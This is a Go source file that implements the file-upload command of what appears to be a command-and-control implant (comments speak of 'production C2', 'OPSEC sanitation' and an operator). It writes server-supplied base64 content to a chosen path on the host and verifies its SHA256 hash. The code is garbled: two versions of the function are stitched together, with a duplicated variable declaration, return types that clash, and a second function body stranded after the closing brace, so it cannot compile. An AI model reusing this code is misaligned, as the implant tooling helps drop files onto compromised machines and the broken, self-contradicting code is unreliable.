package upload

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"numinon_shadow/internal/agent/config"
	"numinon_shadow/internal/models"
	"os"
	"path/filepath"
)

// DoUpload executes the file upload logic.
func DoUpload(args models.UploadArgs) models.UploadResult {

	// Display command arguments to terminal (TODO convert to slog)
	fmt.Println("|✅ UPLOAD DOER| The UPLOAD command has been executed.")
	fmt.Printf("|📋 UPLOAD DETAILS| TargetDir: '%s', TargetFilename: '%s', Overwrite: %t, ExpectedSHA256: %s, ContentLen(b64): %d\n",
		args.TargetDirectory, args.TargetFilename, args.OverwriteIfExists, args.ExpectedSha256, len(args.FileContentBase64))

	// Validate essential arguments
	if args.TargetDirectory == "" {
		return models.UploadResult{Message: "TargetDirectory cannot be empty."}
	}
	if args.TargetFilename == "" {
		return models.UploadResult{Message: "TargetFilename cannot be empty."}
	}
	if args.FileContentBase64 == "" {
		return models.UploadResult{Message: "FileContentBase64 cannot be empty."}
	}
	if args.ExpectedSha256 == "" {
		return models.UploadResult{Message: "ExpectedSha256 cannot be empty."}
	}

	// Decode File Content
	rawFileBytes, err := base64.StdEncoding.DecodeString(args.FileContentBase64)
	if err != nil {
		return models.UploadResult{Message: "Failed to base64 decode file content."}
	}
	log.Printf("|⚙️ UPLOAD ACTION| Decoded file content: %d bytes.", len(rawFileBytes))

	// Construct Full Destination Path

	// Basic sanitization: ensure filename doesn't try to escape the directory.
	// filepath.Clean will help, but more robust sandboxing might be needed for production C2.
	cleanFilename := filepath.Base(args.TargetFilename) // Use only the filename part
	if cleanFilename == "." || cleanFilename == ".." || cleanFilename == "" {
		cleanFilename = "uploaded_file_unspecified_name" // Default if filename is problematic
		log.Printf("|CMD UPLOAD_EXEC| Original TargetFilename was problematic, using default: %s", cleanFilename)
	}

	destinationPath := filepath.Join(args.TargetDirectory, cleanFilename)
	log.Printf("|CMD UPLOAD_EXEC| Resolved destination path: %s", destinationPath)


	// Ensure TargetDirectory exists
	// TODO if not create it, for now, assume it must exist or OS handles error
	// TODO for OPSEC sanitation, ensure TargetDirectory is within an allowed base path
	destinationPath := filepath.Join(args.TargetDirectory, args.TargetFilename)
	log.Printf("|⚙️ UPLOAD ACTION| Full destination path: %s\n", destinationPath)

	// Check for Existing File & Overwrite Logic
	_, statErr := os.Stat(destinationPath)
	if statErr == nil { // File exists
		if !args.OverwriteIfExists {
			return nil, fmt.Errorf("file '%s' already exists and overwrite is not permitted", destinationPath)
		}
		log.Printf("|⚙️ UPLOAD ACTION| File '%s' exists and will be overwritten\n", destinationPath)
	} else if !os.IsNotExist(statErr) { // Some other error trying to stat the file
		return nil, fmt.Errorf("error checking destination file '%s': %w", destinationPath, statErr)
	}

	// Write File to Disk
	// Using 0600 for more restrictive permissions initially.
	err = os.WriteFile(destinationPath, rawFileBytes, 0600)
	if err != nil {
		// TODO: Differentiate common errors like permission denied, disk full
		return nil, fmt.Errorf("failed to write file to '%s': %w", destinationPath, err)
	}
	log.Printf("|⚙️ UPLOAD ACTION| Successfully wrote %d bytes to '%s'", len(rawFileBytes), destinationPath)

	// Verify Integrity (SHA256 Hash of written file)
	// For maximum integrity, read back the file just written to ensure what's on disk is what we hash.
	// If performance is a concern for huge files AND we trust os.WriteFile,
	// we could hash rawFileBytes directly, but reading back is safer.
	writtenBytes, err := os.ReadFile(destinationPath)
	if err != nil {
		// This is problematic: file written but can't be read back for verification.
		return &UploadResult{ // Still return some info
			FilePath:     destinationPath,
			BytesWritten: int64(len(rawFileBytes)), // Assumed written length
			Message:      fmt.Sprintf("File written to '%s', but failed to read back for verification: %v. HASH UNVERIFIED.", destinationPath, err),
		}, fmt.Errorf("file written but could not be re-read for hash verification: %w", err)
	}

	hasher := sha256.New()
	// It's crucial that what we hash here is exactly what the server hashed.
	// The server sent hash of original (decoded) file content.
	// If os.WriteFile is atomic and successful, rawFileBytes should equal writtenBytes.
	// Let's hash rawFileBytes as that's what server sent (after decoding).
	// To be absolutely sure about what's on disk vs expected:
	hasher.Write(writtenBytes) // Hash what was actually read from disk
	actualSha256 := hex.EncodeToString(hasher.Sum(nil))

	resultMsg := fmt.Sprintf("File '%s' uploaded to '%s' (%d bytes). Expected SHA256: %s, Actual SHA256: %s.",
		args.TargetFilename, args.TargetDirectory, len(writtenBytes), args.ExpectedSha256, actualSha256)

	uploadRes := &UploadResult{
		FilePath:     destinationPath,
		BytesWritten: int64(len(writtenBytes)),
		ActualSha256: actualSha256,
		Message:      resultMsg,
	}

	if actualSha256 != args.ExpectedSha256 {
		log.Printf("|❗UPLOAD WARNING| HASH MISMATCH for %s. Expected: %s, Got: %s", destinationPath, args.ExpectedSha256, actualSha256)
		return uploadRes, fmt.Errorf("hash mismatch after write") // Signal error for mismatch
	}

	log.Printf("|👊 UPLOAD SUCCESS| Upload successful and hash VERIFIED for %s.", destinationPath)
	return uploadRes, nil

}


	// 2. Decode File Content


	// 3. Construct Full Destination Path


	// Ensure target directory exists. If not, attempt to create it.
	// This makes the command more robust if the operator specifies a new subdir.
	dir := filepath.Dir(destinationPath)
	if _, statErr := os.Stat(dir); os.IsNotExist(statErr) {
		log.Printf("|CMD UPLOAD_EXEC| Target directory '%s' does not exist. Attempting to create.", dir)
		if mkdirErr := os.MkdirAll(dir, 0755); mkdirErr != nil { // 0755: rwxr-xr-x
			return UploadResult{Message: fmt.Sprintf("Failed to create target directory '%s'.", dir), OperationError: fmt.Errorf("mkdirall failed for '%s': %w", dir, mkdirErr)}
		}
		log.Printf("|CMD UPLOAD_EXEC| Successfully created target directory '%s'.", dir)
	}

	// 4. Check for Existing File & Overwrite Logic
	_, statErr := os.Stat(destinationPath)
	fileExists := !os.IsNotExist(statErr)

	if fileExists && !args.OverwriteIfExists {
		msg := fmt.Sprintf("File '%s' already exists and overwrite is not permitted.", destinationPath)
		log.Printf("|CMD UPLOAD_EXEC| %s", msg)
		return UploadResult{FilePath: destinationPath, Message: msg, OperationError: fmt.Errorf(msg)}
	}
	if fileExists && args.OverwriteIfExists {
		log.Printf("|CMD UPLOAD_EXEC| File '%s' exists and will be overwritten as per OverwriteIfExists=true.", destinationPath)
	}

	// 5. Write File to Disk
	// Use 0600 for more restrictive permissions: read/write for owner only.
	err = os.WriteFile(destinationPath, rawFileBytes, 0600)
	if err != nil {
		// TODO: More granular error detection (permissions, disk full) would be ideal here.
		// For now, any WriteFile error is treated generally.
		msg := fmt.Sprintf("Failed to write file to '%s'.", destinationPath)
		log.Printf("|CMD UPLOAD_EXEC| %s: %v", msg, err)
		return UploadResult{FilePath: destinationPath, Message: msg, OperationError: fmt.Errorf("%s: %w", msg, err)}
	}
	bytesWritten := int64(len(rawFileBytes))
	log.Printf("|CMD UPLOAD_EXEC| Successfully wrote %d bytes to '%s'.", bytesWritten, destinationPath)

	// 6. Verify Integrity (SHA256 Hash of written file)
	// We hash rawFileBytes because that's what the server hashed and sent (after base64).
	// If we read back from disk, it's a double check on the OS write, but for direct upload,
	// hashing the bytes we intended to write is a valid verification of the data *received*.
	hasher := sha256.New()
	hasher.Write(rawFileBytes)
	actualSha256 := hex.EncodeToString(hasher.Sum(nil))

	hashMatched := actualSha256 == args.ExpectedSha256
	finalMessage := fmt.Sprintf("File '%s' uploaded to '%s' (%d bytes). Expected SHA256: %s, Actual SHA256: %s. Hash Verified: %t.",
		cleanFilename, args.TargetDirectory, bytesWritten, args.ExpectedSha256, actualSha256, hashMatched)

	if !hashMatched {
		log.Printf("|WARN CMD UPLOAD_EXEC| HASH MISMATCH for %s.", destinationPath)
		return UploadResult{
			FilePath:       destinationPath,
			ActualSha256:   actualSha256,
			Message:        finalMessage,
			HashMatched:    false,
			OperationError: fmt.Errorf("hash mismatch after write (AgentSHA: %s, ExpectedSHA: %s)", actualSha256, args.ExpectedSha256),
		}
	}

	log.Printf("|CMD UPLOAD_EXEC| Upload successful and hash VERIFIED for %s.", destinationPath)
	return UploadResult{
		FilePath:       destinationPath,
		ActualSha256:   actualSha256,
		Message:        finalMessage,
		HashMatched:    true,
		OperationError: nil, // Success
	}
}
